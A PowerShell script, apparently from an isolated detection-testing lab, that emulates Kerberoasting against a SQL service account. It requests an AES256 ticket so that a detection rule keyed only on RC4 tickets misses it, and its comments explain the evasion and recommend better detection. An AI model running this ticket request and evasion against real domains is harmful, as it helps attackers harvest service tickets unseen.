<#
.SYNOPSIS
    evasion_aes256_opsec_0x12.ps1
    Kich ban 2B (EVASION): Kerberoasting OpSec xin ve AES256 (0x12) nham vao SVC_HIS_Database.
    Vi V1 chi loc TicketEncryptionType = 0x17 nen ve 0x12 vuot qua V1. Lam duoc bang .NET
    native, KHONG can tool ngoai.
.NOTES
    CHAY TRONG LAB CO LAP (clinic.local)
    MITRE ATT&CK: T1558.003.

    Ky thuat: System.IdentityModel.Tokens.KerberosRequestorSecurityToken xin 1 ve TGS cho
    SPN. Vi SVC_HIS_Database ho tro AES256 va client la Windows Server 2022, KDC cap ve
    AES256 (0x12) mac dinh. Do la ly do day la duong evasion tu nhien: khong ep gi, khong
    Rubeus, van ne duoc luat chi bat 0x17.

    Luan diem cho quyen: diem yeu THAT nam o LUAT phu thuoc chu ky encryption-type, khong
    phai o hanh vi tan cong. V3 (nguong/tan suat 4769 toi user-SPN) va V4 (ngu canh) moi la
    huong phat hien dung. Co so 0x17 vs 0x12: docs/PROVENANCE_detection_rules.md, keep.md.
#>

param(
    [string]$Spn = "MSSQLSvc/SRV02.clinic.local:1433"
)

$ErrorActionPreference = "SilentlyContinue"
Write-Host "[*] [SC2-2B EVASION] Kerberoast OpSec xin ve AES256 0x12 nham $Spn (muc tieu: vuot qua V1)." -ForegroundColor Cyan
Write-Host "    BAT DAU: $(Get-Date -Format 'o')" -ForegroundColor Yellow

Add-Type -AssemblyName System.IdentityModel
try {
    # Xin ve TGS cho SPN. KDC cap AES256 (0x12) vi tai khoan ho tro AES.
    $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $Spn
    Write-Host "    Da xin duoc ve TGS cho $Spn (du kien 0x12 AES256). Token Id: $($token.Id)" -ForegroundColor Gray
}
catch {
    Write-Warning "Khong xin duoc ve. Kiem tra SPN da gan dung chua: setspn -Q $Spn"
}

Write-Host "    KET THUC: $(Get-Date -Format 'o')" -ForegroundColor Yellow
Write-Host "[+] [SC2-2B] Xong. Kiem tra DC01 -> Security log -> Event ID 4769, TicketEncryptionType 0x12." -ForegroundColor Green
